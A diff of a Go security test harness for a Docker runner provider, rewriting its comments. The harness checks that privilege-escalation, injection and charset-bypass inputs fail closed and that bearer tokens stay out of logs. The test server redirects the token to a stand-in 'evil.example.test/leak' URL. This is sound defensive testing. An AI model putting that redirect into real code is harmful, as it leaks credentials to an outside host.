@@ -1,28 +1,26 @@
 //go:build dockerverify
 
-// This file adds the M3-W2 hardening re-verification harness: the live-daemon
-// proofs for the cross-family security findings fixed on this branch. It is
-// gated behind the same `dockerverify` build tag as the other harnesses. Run it
-// explicitly against a real daemon:
+// Hardening of the extra_specs privilege channel and of metadata redirects, against
+// a real daemon. Run with:
 //
 //	go test -tags dockerverify -v -run TestVerifyM3Hardening ./internal/verify/
 //
-// It drives the REAL provider binary and proves, on the live daemon, that the
-// extra_specs privilege channel fails CLOSED (zero resources) for each finding:
+// The extra_specs channel must fail closed, creating zero resources, for each of:
 //
-//	H2  extra_env RUN_AS_ROOT (privilege escalation)            -> rejected
-//	H2  extra_env GARM_CRED_WAIT_SECONDS (arith-injection RCE)  -> rejected
-//	H2  a non-allowlisted benign var (fail-closed default)      -> rejected
-//	H3  an env key containing '=' (charset bypass)              -> rejected
-//	H1  a zero memory override "0GiB"                           -> rejected
-//	H2  an operator-ALLOWLISTED benign var                      -> ACCEPTED, present
-//	    in the runner env, while a provider-injected collision (DISABLE_RUNNER_UPDATE)
+//	extra_env RUN_AS_ROOT (privilege escalation)             -> rejected
+//	extra_env GARM_CRED_WAIT_SECONDS (arithmetic injection)  -> rejected
+//	a benign variable that is not allowlisted                -> rejected
+//	an env key containing '=' (charset bypass)               -> rejected
+//	a zero memory override "0GiB"                            -> rejected
+//	an operator-allowlisted benign variable                  -> accepted and present in
+//	    the runner env, while a provider-injected collision (DISABLE_RUNNER_UPDATE)
 //	    still wins the merge
-//	H4  a hostile metadata redirect reflecting the bearer token -> the provider's
-//	    logs (stderr) contain NO substring of the instance token
 //
-// Everything is scoped to a unique controller-id and torn down at the end; the
-// protected foreign containers are asserted present before and after.
+// A hostile metadata redirect that reflects the bearer token must leave no part of
+// the instance token in the provider's logs (stderr).
+//
+// Everything is scoped to a unique controller ID and torn down at the end, and the
+// foreign canary containers are checked before and after.
 package verify
 
 import (
@@ -37,9 +35,9 @@ import (
 	"github.com/TzuH-Hsu/garm-provider-docker/internal/spec"
 )
 
-// hardeningConfig writes a cache-disabled config whose operator allowlist opts
-// exactly MY_BENIGN_VAR and DISABLE_RUNNER_UPDATE into extra_env (H2). Everything
-// else in extra_env is fail-closed by default.
+// hardeningConfig writes a cache-disabled config whose operator allowlist lets
+// exactly MY_BENIGN_VAR and DISABLE_RUNNER_UPDATE through extra_env. Everything else
+// in extra_env fails closed by default.
 func hardeningConfig(t *testing.T, imageTag string) string {
 	t.Helper()
 	f := filepath.Join(t.TempDir(), "config.toml")
@@ -75,9 +73,7 @@ func TestVerifyM3HardeningExtraSpecsPrivilegeChannel(t *testing.T) {
 		assertForeignPresent(t, canaries[1])
 	}()
 
-	// =========================================================================
-	// Rejection cases: each fails closed BEFORE any Docker op (zero resources).
-	// =========================================================================
+	// Each rejection fails closed before any Docker operation, leaving zero resources.
 	reject := []struct {
 		name       string
 		extraSpecs string
@@ -105,10 +101,8 @@ func TestVerifyM3HardeningExtraSpecsPrivilegeChannel(t *testing.T) {
 		}
 	}
 
-	// =========================================================================
-	// Accept case: an operator-ALLOWLISTED var reaches the runner env, while a
-	// provider-injected collision still wins the merge (H2).
-	// =========================================================================
+	// An operator-allowlisted variable reaches the runner env, and a provider-injected
+	// collision still wins the merge.
 	b := bootstrapFor("m3-harden-accept", srv.URL, caBundle)
 	// MY_BENIGN_VAR is allowlisted and does not collide, so it merges through.
 	// DISABLE_RUNNER_UPDATE is allowlisted too, but the provider injects it as
@@ -145,13 +139,10 @@ func TestVerifyM3HardeningExtraSpecsPrivilegeChannel(t *testing.T) {
 		t.Errorf("[accept] %d managed resources remain after teardown, want 0", n)
 	}
 
-	// =========================================================================
-	// H4: a hostile metadata redirect that reflects the bearer instance token
-	// into the redirect URL must not leak the token into the provider's logs.
-	// =========================================================================
+	// A hostile metadata redirect that reflects the bearer token into the redirect URL
+	// must not leak the token into the provider's logs.
 	hostile := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		// Reflect the bearer token into a cleartext, non-loopback redirect
-		// target — the exact hostile-redirect vector H4 fixes.
+		// Reflect the bearer token into a cleartext, non-loopback redirect target.
 		tok := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
 		http.Redirect(w, r, "http://evil.example.test/leak?token="+tok, http.StatusFound)
 	}))
